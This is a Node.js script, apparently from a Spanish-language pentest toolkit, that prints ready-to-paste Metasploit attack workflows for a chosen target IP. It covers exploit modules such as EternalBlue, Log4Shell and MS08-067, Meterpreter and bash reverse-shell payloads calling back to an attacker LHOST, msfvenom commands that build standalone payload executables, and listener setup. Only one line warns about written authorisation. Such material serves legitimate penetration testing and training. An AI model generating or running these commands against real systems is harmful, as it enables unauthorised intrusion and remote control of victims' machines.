#!/usr/bin/env node
/**
 * MFH TOOLS - Metasploit Framework
 * Categoria: Initial Access
 *
 * Uso: node metasploit.js --target <ip> [--port 445] [--module <modulo>] [--payload <payload>] [--lhost <ip>] [--lport 4444]
 *
 * Autor: FalconMX Security
 */

'use strict';

const CONFIG = { version: '1.0.0', author: 'FalconMX Security' };

const MODULES = {
    'exploit/windows/smb/ms17_010_eternalblue': 'EternalBlue (MS17-010)',
    'exploit/multi/http/log4shell_header_injection': 'Log4Shell',
    'exploit/unix/ftp/vsftpd_234_backdoor': 'vsftpd 2.3.4 Backdoor',
    'exploit/multi/http/tomcat_mgr_upload': 'Tomcat Manager Upload',
    'exploit/multi/http/jboss_maindeployer': 'JBoss JMX Deployer',
    'exploit/windows/smb/ms08_067_netapi': 'MS08-067 NetAPI'
};

const PAYLOADS = {
    'windows/x64/meterpreter/reverse_tcp': 'Windows x64 Meterpreter',
    'windows/meterpreter/reverse_tcp': 'Windows x86 Meterpreter',
    'linux/x64/meterpreter/reverse_tcp': 'Linux x64 Meterpreter',
    'linux/x86/meterpreter/reverse_tcp': 'Linux x86 Meterpreter',
    'cmd/unix/reverse_bash': 'Bash Reverse Shell',
    'windows/meterpreter/reverse_https': 'Windows Meterpreter HTTPS'
};

function printReport(target, port, module, payload, lhost, lport) {
    console.log('');
    console.log('='.repeat(65));
    console.log('  METASPLOIT FRAMEWORK');
    console.log('  Target: ' + (target || '192.168.1.10'));
    console.log('  Puerto: ' + (port || '445'));
    console.log('  Modulo: ' + (module || 'exploit/windows/smb/ms17_010_eternalblue'));
    console.log('  Payload: ' + (payload || 'windows/x64/meterpreter/reverse_tcp'));
    console.log('  LHOST: ' + (lhost || '192.168.1.50'));
    console.log('  LPORT: ' + (lport || '4444'));
    console.log('  Fecha: ' + new Date().toISOString());
    console.log('='.repeat(65));
    console.log('');
    console.log('  [Tool] Metasploit Framework');
    console.log('    Metasploit is the world\'s most used penetration testing framework ');
    console.log('');
    console.log('  [Install]');
    console.log('    curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall');
    console.log('    chmod 755 msfinstall && ./msfinstall');
    console.log('    # O en Kali:');
    console.log('    sudo apt install metasploit-framework');
    console.log('');
    console.log('  [Inicializar DB]');
    console.log('    sudo systemctl start postgresql && sudo msfdb init');
    console.log('    msfconsole -q');
    console.log('    msf6 > db_status');
    console.log('');
    console.log('  [Flujo completo - copiar y pegar]');
    console.log('    msfconsole');
    console.log('    use ' + module);
    console.log('    set RHOSTS ' + target);
    console.log('    set RPORT ' + port);
    console.log('    set PAYLOAD ' + payload);
    console.log('    set LHOST ' + lhost);
    console.log('    set LPORT ' + lport);
    console.log('    show options');
    console.log('    run');
    console.log('');
    console.log('  [One-liner]');
    console.log('    msfconsole -q -x "use ' + module + '; set RHOSTS ' + target + '; set RPORT ' + port + '; set PAYLOAD ' + payload + '; set LHOST ' + lhost + '; set LPORT ' + lport + '; run; exit"');
    console.log('');
    console.log('  [Generar payload standalone con msfvenom]');
    console.log('    msfvenom -p ' + payload + ' LHOST=' + lhost + ' LPORT=' + lport + ' -f exe -o payload.exe');
    console.log('    msfvenom -p ' + payload + ' LHOST=' + lhost + ' LPORT=' + lport + ' -f elf -o payload.elf');
    console.log('    msfvenom -p ' + payload + ' LHOST=' + lhost + ' LPORT=' + lport + ' -f raw -o payload.raw');
    console.log('');
    console.log('  [Listener multi/handler]');
    console.log('    use exploit/multi/handler');
    console.log('    set PAYLOAD ' + payload);
    console.log('    set LHOST ' + lhost);
    console.log('    set LPORT ' + lport);
    console.log('    run -j');
    console.log('');
    console.log('  [Modulos disponibles]');
    Object.keys(MODULES).forEach(function(k) {
        console.log('    - ' + k + '  [' + MODULES[k] + ']');
    });
    console.log('');
    console.log('  [Payloads disponibles]');
    Object.keys(PAYLOADS).forEach(function(k) {
        console.log('    - ' + k + '  [' + PAYLOADS[k] + ']');
    });
    console.log('');
    console.log('  [Comandos utiles dentro de msfconsole]');
    console.log('    search <term>       Buscar modulos');
    console.log('    use <module>        Cargar modulo');
    console.log('    info                Ver info del modulo');
    console.log('    show options        Ver opciones requeridas');
    console.log('    show payloads       Ver payloads compatibles');
    console.log('    set <opt> <val>     Configurar opcion');
    console.log('    setg <opt> <val>    Configurar opcion global');
    console.log('    run / exploit       Ejecutar modulo');
    console.log('    sessions            Listar sesiones activas');
    console.log('    back                Salir del modulo');
    console.log('    help                Ayuda general');
    console.log('');
    console.log('-'.repeat(65));
    console.log('  WARN: solo ataca sistemas con autorizacion escrita');
    console.log('-'.repeat(65));
    console.log('');
}

function main() {
    var args = process.argv.slice(2);
    var targetIdx = args.indexOf('--target');
    var portIdx = args.indexOf('--port');
    var moduleIdx = args.indexOf('--module');
    var payloadIdx = args.indexOf('--payload');
    var lhostIdx = args.indexOf('--lhost');
    var lportIdx = args.indexOf('--lport');

    if (args.length === 0) {
        console.log('');
        console.log('+------------------------------------------------------+');
        console.log('|  MFH TOOLS - Metasploit v' + CONFIG.version + '                      |');
        console.log('|  ' + CONFIG.author + '                              |');
        console.log('+------------------------------------------------------+');
        console.log('');
        console.log('  Uso: node metasploit.js --target <ip> [--port 445] [--module <modulo>] [--payload <payload>] [--lhost <ip>] [--lport 4444]');
        console.log('');
        console.log('  Modulos disponibles:');
        Object.keys(MODULES).forEach(function(k) {
            console.log('    - ' + k);
        });
        console.log('');
        console.log('  Payloads disponibles:');
        Object.keys(PAYLOADS).forEach(function(k) {
            console.log('    - ' + k);
        });
        console.log('');
        console.log('  Ejemplos:');
        console.log('    node metasploit.js --target 192.168.1.10 --port 445');
        console.log('    node metasploit.js --target 192.168.1.10 --module exploit/multi/http/log4shell_header_injection --port 8080 --payload linux/x64/meterpreter/reverse_tcp');
        console.log('');
        process.exit(0);
    }

    var target = targetIdx !== -1 ? args[targetIdx + 1] : '192.168.1.10';
    var port = portIdx !== -1 ? args[portIdx + 1] : '445';
    var module = moduleIdx !== -1 ? args[moduleIdx + 1] : 'exploit/windows/smb/ms17_010_eternalblue';
    var payload = payloadIdx !== -1 ? args[payloadIdx + 1] : 'windows/x64/meterpreter/reverse_tcp';
    var lhost = lhostIdx !== -1 ? args[lhostIdx + 1] : '192.168.1.50';
    var lport = lportIdx !== -1 ? args[lportIdx + 1] : '4444';

    console.log('\nGenerando comandos Metasploit...\n');
    printReport(target, port, module, payload, lhost, lport);
}

main();
